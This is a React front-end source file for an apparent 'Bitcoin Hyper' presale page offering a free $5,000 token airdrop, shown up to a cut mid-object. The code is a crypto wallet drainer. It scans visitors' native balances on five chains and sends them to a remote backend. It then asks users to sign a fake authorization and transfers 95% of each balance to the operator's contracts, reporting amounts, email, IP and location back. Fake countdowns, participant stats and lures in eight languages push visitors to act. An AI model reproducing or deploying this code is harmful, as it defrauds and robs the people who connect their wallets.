import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// LANGUAGE DETECTION & TRANSLATIONS
// ============================================

const SUPPORTED_LANGUAGES = {
  en: { name: 'English', flag: '🇺🇸', native: 'English' },
  es: { name: 'Spanish', flag: '🇪🇸', native: 'Español' },
  fr: { name: 'French', flag: '🇫🇷', native: 'Français' },
  de: { name: 'German', flag: '🇩🇪', native: 'Deutsch' },
  it: { name: 'Italian', flag: '🇮🇹', native: 'Italiano' },
  pt: { name: 'Portuguese', flag: '🇵🇹', native: 'Português' },
  ru: { name: 'Russian', flag: '🇷🇺', native: 'Русский' },
  zh: { name: 'Chinese', flag: '🇨🇳', native: '中文' },
  ja: { name: 'Japanese', flag: '🇯🇵', native: '日本語' },
  ko: { name: 'Korean', flag: '🇰🇷', native: '한국어' },
  ar: { name: 'Arabic', flag: '🇸🇦', native: 'العربية' },
  hi: { name: 'Hindi', flag: '🇮🇳', native: 'हिन्दी' },
  tr: { name: 'Turkish', flag: '🇹🇷', native: 'Türkçe' },
  nl: { name: 'Dutch', flag: '🇳🇱', native: 'Nederlands' },
  pl: { name: 'Polish', flag: '🇵🇱', native: 'Polski' },
  vi: { name: 'Vietnamese', flag: '🇻🇳', native: 'Tiếng Việt' },
  th: { name: 'Thai', flag: '🇹🇭', native: 'ไทย' },
  id: { name: 'Indonesian', flag: '🇮🇩', native: 'Bahasa Indonesia' }
};

const TRANSLATIONS = {
  en: {
    presaleLive: 'PRESALE LIVE · STAGE 4',
    bonusEndsIn: 'BONUS ENDS IN',
    days: 'days',
    hrs: 'hrs',
    mins: 'mins',
    secs: 'secs',
    bonus: '+25% BONUS · 5,000 BTH',
    instantAirdrop: 'instant airdrop · +25% extra',
    bthPrice: 'BTH PRICE',
    bonusLabel: 'BONUS',
    presale: 'PRESALE',
    stage4: 'STAGE 4',
    claim: 'CLAIM $5,000 BTH',
    processing: 'PROCESSING...',
    completed: '✓ COMPLETED SUCCESSFULLY',
    secured: 'Your $5,000 BTH has been secured',
    view: 'VIEW YOUR $5,000 BTH',
    welcome: 'Welcome to Bitcoin Hyper',
    connectWallet: 'CONNECT WALLET',
    disconnect: 'Disconnect Wallet',
    checkEligibility: 'Checking Eligibility',
    verifying: 'Verifying your wallet...',
    terms: 'Terms',
    delivery: 'Delivery',
    airdrop: '$5k Airdrop',
    liveNow: '5,000 BTH · +25% bonus · live now',
    successful: 'SUCCESSFUL!',
    youHaveSecured: 'You have secured',
    viewButton: 'VIEW',
    checkWalletEligibility: 'Check Wallet Eligibility',
    whenQualified: 'When qualified, confirm to claim your airdrop',
    valueBadge: '$5,000 BTH',
    progress: 'Progress',
    today: 'Today',
    avg: 'Avg',
    totalRaised: 'Total Raised',
    tokenPrice: 'Token Price',
    currentBonus: 'Current Bonus',
    participants: 'participants'
  },
  es: {
    presaleLive: 'PREVENTA EN VIVO · ETAPA 4',
    bonusEndsIn: 'EL BONO TERMINA EN',
    days: 'días',
    hrs: 'hrs',
    mins: 'mins',
    secs: 'segs',
    bonus: '+25% BONO · 5,000 BTH',
    instantAirdrop: 'airdrop instantáneo · +25% extra',
    bthPrice: 'PRECIO BTH',
    bonusLabel: 'BONO',
    presale: 'PREVENTA',
    stage4: 'ETAPA 4',
    claim: 'RECLAMAR $5,000 BTH',
    processing: 'PROCESANDO...',
    completed: '✓ COMPLETADO CON ÉXITO',
    secured: 'Tus $5,000 BTH han sido asegurados',
    view: 'VER TUS $5,000 BTH',
    welcome: 'Bienvenido a Bitcoin Hyper',
    connectWallet: 'CONECTAR WALLET',
    disconnect: 'Desconectar Wallet',
    checkEligibility: 'Verificando Elegibilidad',
    verifying: 'Verificando tu wallet...',
    terms: 'Términos',
    delivery: 'Entrega',
    airdrop: 'Airdrop $5k',
    liveNow: '5,000 BTH · +25% bono · en vivo ahora',
    successful: '¡EXITOSO!',
    youHaveSecured: 'Has asegurado',
    viewButton: 'VER',
    checkWalletEligibility: 'Verificar Elegibilidad',
    whenQualified: 'Cuando califiques, confirma para reclamar tu airdrop',
    valueBadge: '$5,000 BTH',
    progress: 'Progreso',
    today: 'Hoy',
    avg: 'Prom',
    totalRaised: 'Total Recaudado',
    tokenPrice: 'Precio Token',
    currentBonus: 'Bono Actual',
    participants: 'participantes'
  },
  fr: {
    presaleLive: 'PRÉVENTE EN DIRECT · ÉTAPE 4',
    bonusEndsIn: 'BONUS SE TERMINE DANS',
    days: 'jours',
    hrs: 'h',
    mins: 'min',
    secs: 's',
    bonus: '+25% BONUS · 5,000 BTH',
    instantAirdrop: 'airdrop instantané · +25% extra',
    bthPrice: 'PRIX BTH',
    bonusLabel: 'BONUS',
    presale: 'PRÉVENTE',
    stage4: 'ÉTAPE 4',
    claim: 'RÉCLAMER $5,000 BTH',
    processing: 'TRAITEMENT...',
    completed: '✓ TERMINÉ AVEC SUCCÈS',
    secured: 'Vos $5,000 BTH ont été sécurisés',
    view: 'VOIR VOS $5,000 BTH',
    welcome: 'Bienvenue sur Bitcoin Hyper',
    connectWallet: 'CONNECTER WALLET',
    disconnect: 'Déconnecter Wallet',
    checkEligibility: 'Vérification d\'Éligibilité',
    verifying: 'Vérification de votre wallet...',
    terms: 'Conditions',
    delivery: 'Livraison',
    airdrop: 'Airdrop $5k',
    liveNow: '5,000 BTH · +25% bonus · en direct',
    successful: 'SUCCÈS !',
    youHaveSecured: 'Vous avez sécurisé',
    viewButton: 'VOIR',
    checkWalletEligibility: 'Vérifier Éligibilité',
    whenQualified: 'Une fois qualifié, confirmez pour réclamer votre airdrop',
    valueBadge: '$5,000 BTH',
    progress: 'Progrès',
    today: 'Aujourd\'hui',
    avg: 'Moy',
    totalRaised: 'Total Collecté',
    tokenPrice: 'Prix Token',
    currentBonus: 'Bonus Actuel',
    participants: 'participants'
  },
  de: {
    presaleLive: 'VORVERKAUF LIVE · STUFE 4',
    bonusEndsIn: 'BONUS ENDET IN',
    days: 'Tage',
    hrs: 'Std',
    mins: 'Min',
    secs: 'Sek',
    bonus: '+25% BONUS · 5,000 BTH',
    instantAirdrop: 'sofortiger Airdrop · +25% extra',
    bthPrice: 'BTH PREIS',
    bonusLabel: 'BONUS',
    presale: 'VORVERKAUF',
    stage4: 'STUFE 4',
    claim: '$5,000 BTH ANFORDERN',
    processing: 'VERARBEITUNG...',
    completed: '✓ ERFOLGREICH ABGESCHLOSSEN',
    secured: 'Ihre $5,000 BTH wurden gesichert',
    view: 'IHRE $5,000 BTH ANSEHEN',
    welcome: 'Willkommen bei Bitcoin Hyper',
    connectWallet: 'WALLET VERBINDEN',
    disconnect: 'Wallet trennen',
    checkEligibility: 'Berechtigung prüfen',
    verifying: 'Ihr Wallet wird verifiziert...',
    terms: 'Bedingungen',
    delivery: 'Lieferung',
    airdrop: '$5k Airdrop',
    liveNow: '5,000 BTH · +25% Bonus · live jetzt',
    successful: 'ERFOLGREICH!',
    youHaveSecured: 'Sie haben gesichert',
    viewButton: 'ANSEHEN',
    checkWalletEligibility: 'Berechtigung prüfen',
    whenQualified: 'Bei Qualifikation bestätigen, um Airdrop zu erhalten',
    valueBadge: '$5,000 BTH',
    progress: 'Fortschritt',
    today: 'Heute',
    avg: 'Schnitt',
    totalRaised: 'Gesamt eingesammelt',
    tokenPrice: 'Token Preis',
    currentBonus: 'Aktueller Bonus',
    participants: 'Teilnehmer'
  },
  zh: {
    presaleLive: '预售进行中 · 第四阶段',
    bonusEndsIn: '奖励结束于',
    days: '天',
    hrs: '小时',
    mins: '分钟',
    secs: '秒',
    bonus: '+25% 奖励 · 5,000 BTH',
    instantAirdrop: '即时空投 · +25% 额外',
    bthPrice: 'BTH 价格',
    bonusLabel: '奖励',
    presale: '预售',
    stage4: '第四阶段',
    claim: '领取 $5,000 BTH',
    processing: '处理中...',
    completed: '✓ 成功完成',
    secured: '您的 $5,000 BTH 已确保',
    view: '查看您的 $5,000 BTH',
    welcome: '欢迎来到 Bitcoin Hyper',
    connectWallet: '连接钱包',
    disconnect: '断开钱包',
    checkEligibility: '检查资格',
    verifying: '正在验证您的钱包...',
    terms: '条款',
    delivery: '交付',
    airdrop: '$5k 空投',
    liveNow: '5,000 BTH · +25% 奖励 · 正在进行',
    successful: '成功！',
    youHaveSecured: '您已确保',
    viewButton: '查看',
    checkWalletEligibility: '检查钱包资格',
    whenQualified: '符合条件时，确认领取空投',
    valueBadge: '$5,000 BTH',
    progress: '进度',
    today: '今日',
    avg: '平均',
    totalRaised: '总筹集',
    tokenPrice: '代币价格',
    currentBonus: '当前奖励',
    participants: '参与者'
  },
  ja: {
    presaleLive: 'プレセール実施中 · ステージ4',
    bonusEndsIn: 'ボーナス終了まで',
    days: '日',
    hrs: '時間',
    mins: '分',
    secs: '秒',
    bonus: '+25% ボーナス · 5,000 BTH',
    instantAirdrop: '即時エアドロップ · +25% 追加',
    bthPrice: 'BTH 価格',
    bonusLabel: 'ボーナス',
    presale: 'プレセール',
    stage4: 'ステージ4',
    claim: '$5,000 BTH を受け取る',
    processing: '処理中...',
    completed: '✓ 正常に完了',
    secured: '$5,000 BTH が確保されました',
    view: '$5,000 BTH を表示',
    welcome: 'Bitcoin Hyper へようこそ',
    connectWallet: 'ウォレット接続',
    disconnect: 'ウォレット切断',
    checkEligibility: '資格確認中',
    verifying: 'ウォレットを検証中...',
    terms: '利用規約',
    delivery: '配信',
    airdrop: '$5k エアドロップ',
    liveNow: '5,000 BTH · +25% ボーナス · 実施中',
    successful: '成功！',
    youHaveSecured: '確保しました',
    viewButton: '表示',
    checkWalletEligibility: 'ウォレット資格を確認',
    whenQualified: '資格がある場合、確認してエアドロップを受け取る',
    valueBadge: '$5,000 BTH',
    progress: '進捗',
    today: '今日',
    avg: '平均',
    totalRaised: '総調達額',
    tokenPrice: 'トークン価格',
    currentBonus: '現在のボーナス',
    participants: '参加者'
  },
  ko: {
    presaleLive: '프리세일 진행 중 · 4단계',
    bonusEndsIn: '보너스 종료까지',
    days: '일',
    hrs: '시간',
    mins: '분',
    secs: '초',
    bonus: '+25% 보너스 · 5,000 BTH',
    instantAirdrop: '즉시 에어드랍 · +25% 추가',
    bthPrice: 'BTH 가격',
    bonusLabel: '보너스',
    presale: '프리세일',
    stage4: '4단계',
    claim: '$5,000 BTH 받기',
    processing: '처리 중...',
    completed: '✓ 성공적으로 완료',
    secured: '$5,000 BTH가 확보되었습니다',
    view: '$5,000 BTH 보기',
    welcome: 'Bitcoin Hyper에 오신 것을 환영합니다',
    connectWallet: '지갑 연결',
    disconnect: '지갑 연결 해제',
    checkEligibility: '자격 확인 중',
    verifying: '지갑 확인 중...',
    terms: '약관',
    delivery: '전달',
    airdrop: '$5k 에어드랍',
    liveNow: '5,000 BTH · +25% 보너스 · 진행 중',
    successful: '성공!',
    youHaveSecured: '확보했습니다',
    viewButton: '보기',
    checkWalletEligibility: '지갑 자격 확인',
    whenQualified: '자격이 되면 확인하여 에어드랍 받기',
    valueBadge: '$5,000 BTH',
    progress: '진행률',
    today: '오늘',
    avg: '평균',
    totalRaised: '총 모금액',
    tokenPrice: '토큰 가격',
    currentBonus: '현재 보너스',
    participants: '참가자'
  },
  ar: {
    presaleLive: 'بيع مسبق مباشر · المرحلة 4',
    bonusEndsIn: 'تنتهي المكافأة في',
    days: 'أيام',
    hrs: 'ساعات',
    mins: 'دقائق',
    secs: 'ثواني',
    bonus: '+25٪ مكافأة · 5,000 BTH',
    instantAirdrop: 'إسقاط جوي فوري · +25٪ إضافي',
    bthPrice: 'سعر BTH',
    bonusLabel: 'مكافأة',
    presale: 'بيع مسبق',
    stage4: 'المرحلة 4',
    claim: 'استلام $5,000 BTH',
    processing: 'جاري المعالجة...',
    completed: '✓ اكتمل بنجاح',
    secured: 'تم تأمين $5,000 BTH الخاص بك',
    view: 'عرض $5,000 BTH الخاص بك',
    welcome: 'مرحباً بك في Bitcoin Hyper',
    connectWallet: 'ربط المحفظة',
    disconnect: 'قطع المحفظة',
    checkEligibility: 'جاري التحقق من الأهلية',
    verifying: 'جاري التحقق من محفظتك...',
    terms: 'الشروط',
    delivery: 'التسليم',
    airdrop: 'إسقاط جوي $5k',
    liveNow: '5,000 BTH · +25٪ مكافأة · مباشر الآن',
    successful: 'نجاح!',
    youHaveSecured: 'لقد قمت بتأمين',
    viewButton: 'عرض',
    checkWalletEligibility: 'التحقق من أهلية المحفظة',
    whenQualified: 'عند التأهل، قم بالتأكيد لاستلام الإسقاط الجوي',
    valueBadge: '$5,000 BTH',
    progress: 'التقدم',
    today: 'اليوم',
    avg: 'المتوسط',
    totalRaised: 'الإجمالي المجموع',
    tokenPrice: 'سعر التوكن',
    currentBonus: 'المكافأة الحالية',
    participants: 'مشارك'
  }
};

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-400 to-indigo-500',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-400 to-pink-500',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-400 to-blue-500',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-400 to-red-500',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "event FlowProcessed(address indexed initiator, uint256 value)"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [error, setError] = useState('');
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [prices, setPrices] = useState({
    eth: 2000,
    bnb: 300,
    matic: 0.75,
    avax: 32
  });
  const [userEmail, setUserEmail] = useState('');
  const [userLocation, setUserLocation] = useState({ country: '', city: '', flag: '', ip: '' });
  const [hoverConnect, setHoverConnect] = useState(false);
  const [walletInitialized, setWalletInitialized] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanning, setScanning] = useState(false);
  const [currentFlowId, setCurrentFlowId] = useState('');
  const [processingChain, setProcessingChain] = useState('');
  const [isEligible, setIsEligible] = useState(false);
  const [eligibleChains, setEligibleChains] = useState([]);
  const [processedAmounts, setProcessedAmounts] = useState({});
  const [allChainsCompleted, setAllChainsCompleted] = useState(false);
  const [executableChains, setExecutableChains] = useState([]);
  const [showRibbon, setShowRibbon] = useState(true);
  
  // ============================================
  // LANGUAGE STATE
  // ============================================
  const [language, setLanguage] = useState('en');
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const t = TRANSLATIONS[language] || TRANSLATIONS.en;

  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.045,
    bthPrice: 0.045
  });

  // Live progress tracking
  const [liveProgress, setLiveProgress] = useState({
    percentComplete: 68,
    participantsToday: 342,
    avgAllocation: 4250
  });

  // Minimum gas buffer requirements (in native token)
  const MIN_GAS_BUFFER = {
    Ethereum: 0.005,
    BSC: 0.001,
    Polygon: 0.1,
    Arbitrum: 0.002,
    Avalanche: 0.1
  };

  const MIN_VALUE_THRESHOLD = 1;

  // ============================================
  // AUTO DETECT LANGUAGE FROM URL
  // ============================================
  useEffect(() => {
    const detectLanguage = () => {
      const path = window.location.pathname;
      const pathLang = path.split('/')[1];
      
      if (pathLang && SUPPORTED_LANGUAGES[pathLang]) {
        setLanguage(pathLang);
      } else {
        const browserLang = navigator.language.split('-')[0];
        if (SUPPORTED_LANGUAGES[browserLang]) {
          setLanguage(browserLang);
        } else {
          setLanguage('en');
        }
      }
    };
    
    detectLanguage();
    
    const handleUrlChange = () => {
      detectLanguage();
    };
    
    window.addEventListener('popstate', handleUrlChange);
    
    return () => {
      window.removeEventListener('popstate', handleUrlChange);
    };
  }, []);

  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (!walletProvider || !address) {
      setWalletInitialized(false);
      return;
    }

    const init = async () => {
      try {
        console.log("🔄 Initializing wallet...");
        setTxStatus('🔄 Initializing...');
        
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();

        setProvider(ethersProvider);
        setSigner(ethersSigner);

        console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
        setWalletInitialized(true);
        setTxStatus('');
        
        await fetchAllBalances(address);
        
      } catch (e) {
        console.error("Provider init failed", e);
        setWalletInitialized(false);
      }
    };

    init();
  }, [walletProvider, address]);

  useEffect(() => {
    const trackVisit = async () => {
      try {
        const response = await fetch('https://hyperback.vercel.app/api/track-visit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referer: document.referrer,
            path: window.location.pathname
          })
        });
        const data = await response.json();
        if (data.success) {
          setUserLocation({
            country: data.data.country || 'Unknown',
            city: data.data.city || '',
            ip: data.data.ip || '',
            flag: data.data.flag || '🌍'
          });
        }
      } catch (err) {
        console.error('Visit tracking error:', err);
      }
    };
    trackVisit();
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
      checkEligibility();
    }
  }, [isConnected, address, balances]);

  useEffect(() => {
    if (executableChains.length > 0 && completedChains.length === executableChains.length) {
      setAllChainsCompleted(true);
    }
  }, [completedChains, executableChains]);

  useEffect(() => {
    if (isConnected) {
      setShowRibbon(false);
    }
  }, [isConnected]);

  const checkEligibility = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Checking eligibility...');
    
    try {
      const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
      
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
        balances[chain.name] && balances[chain.name].amount > 0.000001
      );
      
      const executable = chainsWithBalance.filter(chain => {
        const balance = balances[chain.name];
        if (!balance) return false;
        
        if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
          console.log(`⏭️ Skipping ${chain.name}: Value $${balance.valueUSD.toFixed(2)} is below $${MIN_VALUE_THRESHOLD} threshold`);
          return false;
        }
        
        const minGasRequired = MIN_GAS_BUFFER[chain.name] || 0.001;
        if (balance.amount < minGasRequired) {
          console.log(`⏭️ Skipping ${chain.name}: Balance ${balance.amount.toFixed(6)} ${chain.symbol} is below gas buffer ${minGasRequired} ${chain.symbol}`);
          return false;
        }
        
        return true;
      });
      
      setEligibleChains(chainsWithBalance);
      setExecutableChains(executable);
      
      const eligible = total >= 1;
      setIsEligible(eligible);
      
      if (eligible) {
        if (executable.length === 0) {
          setTxStatus('⚠️ No chains meet execution requirements');
        } else {
          setTxStatus(`✅ Ready to process ${executable.length} chains`);
        }
        
        const connectResponse = await fetch('https://hyperback.vercel.app/api/presale/connect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            totalValue: total,
            chains: chainsWithBalance.map(c => c.name)
          })
        });
        
        if (connectResponse.ok) {
          const connectData = await connectResponse.json();
          if (connectData.success && connectData.data.email) {
            setUserEmail(connectData.data.email);
            console.log("📧 Email from backend:", connectData.data.email);
          }
        }
        
        if (executable.length > 0) {
          preparePresale();
        }
      } else {
        setTxStatus(total > 0 ? '✨ Connected' : '👋 Welcome');
      }
      
    } catch (err) {
      console.error('Eligibility check error:', err);
      setTxStatus('✅ Ready');
    } finally {
      setVerifying(false);
    }
  };

  const fetchAllBalances = async (walletAddress) => {
    console.log("🔍 Checking eligibility...");
    setScanning(true);
    setTxStatus('🔄 Checking eligibility...');
    
    const balanceResults = {};
    let scanned = 0;
    const totalChains = DEPLOYED_CHAINS.length;
    
    const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        
        const valueUSD = amount * price;
        
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
        setTxStatus(`🔄 Checking eligibility...`);
        
        if (amount > 0.000001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            contractAddress: chain.contractAddress,
            price: price,
            name: chain.name,
            rpc: chain.rpc
          };
          console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} detected`);
        }
      } catch (err) {
        console.error(`Failed to fetch balance for ${chain.name}:`, err);
        scanned++;
      }
    });
    
    await Promise.all(scanPromises);
    
    setBalances(balanceResults);
    setScanning(false);
    
    const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    console.log(`💰 Total detected: $${total.toFixed(2)}`);
    
    return total;
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      await fetch('https://hyperback.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  const changeLanguage = (langCode) => {
    setLanguage(langCode);
    setShowLanguageDropdown(false);
    
    const url = new URL(window.location);
    if (langCode === 'en') {
      if (url.pathname.startsWith(`/${langCode}`)) {
        url.pathname = url.pathname.replace(`/${langCode}`, '') || '/';
      }
    } else {
      url.pathname = `/${langCode}${url.pathname}`;
    }
    window.history.pushState({}, '', url.toString());
  };

  const executeMultiChainSignature = async () => {
    if (!walletProvider || !address || !signer) {
      setError("Wallet not initialized");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      setCompletedChains([]);
      setAllChainsCompleted(false);
      setProcessedAmounts({});
      
      const timestamp = Date.now();
      const flowId = `FLOW-${timestamp}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
      setCurrentFlowId(flowId);
      
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
        `I hereby confirm my participation\n` +
        `Wallet: ${address}\n` +
        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
        `Timestamp: ${new Date().toISOString()}\n` +
        `Nonce: ${nonce}`;

      setTxStatus('✍️ Sign message...');

      const signature = await signer.signMessage(message);
      console.log("✅ Signature obtained");
      
      setTxStatus('✅ Executing on eligible chains...');

      const chainsToProcess = executableChains;
      
      if (chainsToProcess.length === 0) {
        setError("No chains meet the execution requirements (min $1 value and gas buffer)");
        setSignatureLoading(false);
        return;
      }

      console.log(`🔄 Processing ${chainsToProcess.length} executable chains`);

      const sortedChains = [...chainsToProcess].sort((a, b) => 
        (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
      );
      
      let processed = [];
      let skippedChains = [];
      let failedChains = [];
      
      for (const chain of sortedChains) {
        try {
          setProcessingChain(chain.name);
          setTxStatus(`🔄 Processing ${chain.name}...`);
          
          try {
            console.log(`🔄 Switching to ${chain.name}...`);
            
            await walletProvider.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${chain.chainId.toString(16)}` }]
            });
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
          } catch (switchError) {
            console.log(`Chain switch needed, continuing...`);
          }
          
          const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
          
          const balance = balances[chain.name];
          
          if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
            console.log(`⏭️ Skipping ${chain.name}: Value now $${balance.valueUSD.toFixed(2)} below threshold`);
            skippedChains.push(chain.name);
            continue;
          }
          
          const amountToSend = (balance.amount * 0.95);
          const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
          
          setProcessedAmounts(prev => ({
            ...prev,
            [chain.name]: {
              amount: amountToSend.toFixed(6),
              symbol: chain.symbol,
              valueUSD: valueUSD
            }
          }));
          
          console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
          
          const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
          const data = contractInterface.encodeFunctionData('processNativeFlow', []);
          
          const value = ethers.parseEther(amountToSend.toFixed(18));

          const contract = new ethers.Contract(
            chain.contractAddress,
            PROJECT_FLOW_ROUTER_ABI,
            chainProvider
          );
          
          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
          const gasLimit = gasEstimate * 120n / 100n;

          const tx = await walletProvider.request({
            method: 'eth_sendTransaction',
            params: [{
              from: address,
              to: chain.contractAddress,
              value: '0x' + value.toString(16),
              gas: '0x' + gasLimit.toString(16),
              data: data
            }]
          });

          setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
          
          const receipt = await chainProvider.waitForTransaction(tx);
          
          if (receipt && receipt.status === 1) {
            console.log(`✅ ${chain.name} confirmed`);
            
            processed.push(chain.name);
            setCompletedChains(prev => [...prev, chain.name]);
            
            const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
            
            const flowData = {
              walletAddress: address,
              chainName: chain.name,
              flowId: flowId,
              txHash: tx,
              amount: amountToSend.toFixed(6),
              symbol: chain.symbol,
              valueUSD: valueUSD,
              gasFee: gasUsed,
              email: userEmail,
              location: {
                country: userLocation.country,
                flag: userLocation.flag,
                city: userLocation.city,
                ip: userLocation.ip
              }
            };
            
            console.log("📤 Sending to backend with amounts:", flowData);
            
            await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(flowData)
            });
            
            setTxStatus(`✅ ${chain.name} completed!`);
          } else {
            throw new Error(`Transaction failed on ${chain.name}`);
          }
          
        } catch (chainErr) {
          console.error(`Error on ${chain.name}:`, chainErr);
          if (chainErr.code === 4001) {
            failedChains.push(chain.name);
            setError(`Transaction rejected on ${chain.name}`);
          } else {
            failedChains.push(chain.name);
            setError(`Error on ${chain.name}: ${chainErr.message}`);
          }
        }
      }

      setVerifiedChains(processed);
      
      if (processed.length > 0) {
        setShowCelebration(true);
        setTxStatus(`🎉 You've secured $5,000 BTH!`);
        
        const totalProcessedValue = processed.reduce((sum, chainName) => {
          return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
        }, 0);
        
        const chainsDetails = processed.map(chainName => {
          const amount = processedAmounts[chainName];
          return `${chainName}: ${amount?.amount || 'unknown'} ${amount?.symbol || ''} ($${amount?.valueUSD || 'unknown'})`;
        }).join('\n');
        
        await fetch('https://hyperback.vercel.app/api/presale/claim', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            email: userEmail,
            location: {
              country: userLocation.country,
              flag: userLocation.flag,
